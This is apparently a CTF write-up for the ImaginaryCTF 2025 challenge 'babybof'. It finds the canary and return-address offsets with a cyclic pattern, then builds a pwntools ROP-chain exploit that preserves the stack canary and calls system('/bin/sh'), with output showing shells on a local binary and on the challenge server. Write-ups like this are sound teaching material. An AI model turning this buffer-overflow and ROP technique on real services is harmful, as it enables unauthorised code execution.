+++
title = 'ImaginaryCTF 2025 Pwn Writeup: babybof'
description = 'Complete Writeup for ImaginaryCTF 2025 Pwn Challenge babybof'
date = 2025-09-08
author = 'Shruti Priya'
+++

**Author: Shruti Priya**

Hello and welcome to the writeup for [ImaginaryCTF 2025 Pwn Challenge babybof](https://2025.imaginaryctf.org/Challenges). This is a beginner level pwn challenge and involves the use of ROP Chain to achieve a shell.

## Understanding the Binary

Before disassembling the binary, let's run it locally and get a feel of how it works.

```bash
$ ./vuln
Welcome to babybof!
Here is some helpful info:
system @ 0x7c7f53458750
pop rdi; ret @ 0x4011ba
ret @ 0x4011bb
"/bin/sh" @ 0x404038
canary: 0x8fb67032276b7f00
enter your input (make sure your stack is aligned!): 
```

The binary gives us "some helpful info" such as: the memory address of the `system` function, `ret` and `pop rdi; ret` gadgets and where is the string `/bin/sh` is present in memory. Moreover, there is also a `stack canary` which checks if the stack is being smashed. This is a classic buffer overflow challenge where we have to ensure the `canary` does not detect our payload. I first generate some cyclic pattern to figure out the offset of the `canary` from the input. For generating the cycling pattern and checking offset, I use the Python library `msfpatterns`.

## Finding offset

```python
from msfpatterns import generate_pattern
generate_pattern(128)
'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae' 
```

Inserting this pattern into the binary:

```bash
$ ./vuln
Welcome to babybof!
Here is some helpful info:
system @ 0x7a53ee858750
pop rdi; ret @ 0x4011ba
ret @ 0x4011bb
"/bin/sh" @ 0x404038
canary: 0xe54015725bff3800
enter your input (make sure your stack is aligned!):  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
your input: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
canary: 0x4130634139624138
return address: 0x6341356341346341
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

We overflowed the buffer and the `canary` detected stack smashing. Now, based on the memory addresses (which is just our cyclic pattern) detected by the `canary` and the `return address`, we can figure out the offset.

```python
from msfpatterns import find_offset
find_offset('0x4130634139624138', 128)      # canary address
[56]
find_offset('0x6341356341346341', 128)      # return address
[72]
```

The `canary` is at the offset of 56 bytes while the return address is at the offset of 72 bytes. Now, let's check if we have found the correct offset. Also note how the memory address for `canary` and `system` changed on another invocation of the binary. This means that these two addresses will keep changing and we should develop a payload based on this information.

```python
from pwn import *

def print_lines(io):
    info("Printing io received lines")
    while True:
        try:
            line = io.recvline()
            success(linbinarye)
        except EOFError:
            break

context(os='linux', arch='amd64', log_level='info')
p = process("./vuln")

offset = 56
canary = int(p.recvline_startswith(b'canary: ').split(b"0x", 2)[1].strip().decode(), 16)

payload = [
    b'A'*offset,
    p64(canary)
]

p.sendlineafter(b'aligned!): ', b''.join(payload))
print_lines(p)
```

Let's run this exploit.

```bash
$ python exploit.py
[+] Starting local process './vuln': pid 26176
canary: 0x3877f79e78920100
[*] Printing io received lines
[*] Process './vuln' stopped with exit code 0 (pid 26176)
[+] your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] canary: 0x3877f79e78920100
[+] return address: 0x7049cf62a1ca
```

Wonderful! Our offset is correct and we have successfully overwritten the actual `canary` with a new `canary` value (this new value is just the old value but it protects our program from crashing since the `canary` is preserved). Armed with this knowledge, let's start building our final exploit.

## Crafting final exploit

First, we have to send 56 bytes to reach the offset, then we add the `canary` value to preserve the `canary` and prevent the program from exiting due to stack smashing. Finally, we need to add the actual payload which will execute the `/bin/sh` function and drop us into a shell. 

Before crafting the final payload, I should explain one more thing. We cannot send our payload right after the `canary` value since there must be a saved base pointer right after the `canary`. Our payload must begin _after_ this base pointer to actually overwrite the return address and give us control of the program flow. Great, now let's craft the exploit.

```python
from pwn import *

context(os='linux', arch='amd64', log_level='info')

#host = 'babybof.chal.imaginaryctf.org' 
#port = 1337

#p = remote(host, port)
p = process("./vuln")

offset = 56

system_addr = int(p.recvline_startswith(b'system @ ').split(b"0x", 2)[1].strip().decode(), 16)
canary = int(p.recvline_startswith(b'canary: ').split(b"0x", 2)[1].strip().decode(), 16)
ret = 0x4011bb
pop_rdi_ret = 0x4011ba
binsh = 0x404038

rop_chain = [
    p64(ret),              # Align stack
    p64(pop_rdi_ret),      # Pop /bin/sh address into rdi
    p64(binsh),            # Address of /bin/sh
    p64(system_addr)       # Call system(/bin/sh)
]

payload = [
    b'A'*56,
    p64(canary),
    b'B' * 8,
    *rop_chain
]

p.sendlineafter(b'aligned!): ', b''.join(payload))
p.interactive()
```

Here, we have the `b'A' * 56` for the initial 56 bytes, then we have the `canary`, then we insert random 8 bytes to get rid of base pointer. Finally, we have the `rop_chain`. This `rop_chain` calls the `system` function with the argument `/bin/sh` to give us a shell. Let's run this locally for testing.

```bash
$ python exploit.py
[+] Starting local process './vuln': pid 30753
[*] Switching to interactive mode
your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
canary: 0x345834f8e687e300
return address: 0x4011bb
$ whoami
shru
$  
```

And we have the shell! Now let's run this exploit on the server and get our flag.

```bash
$ python exploit.py
[ ] Opening connection to babybof.chal.imaginaryctf.org on port 1337: Done
[*] Switching to interactive mode
your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
canary: 0xfbabb22136e95f00
return address: 0x4011bb
$ whoami
ubuntu
$ cat flag.txt
ictf{*****_**********_*******_***_*****_******_***_*******}
$ 
```

And `babybof` is pwned. This was a fun challenge and I learnt how to craft ROP Chains with pwntools. Thank you for reading and I will see you in the next writeup.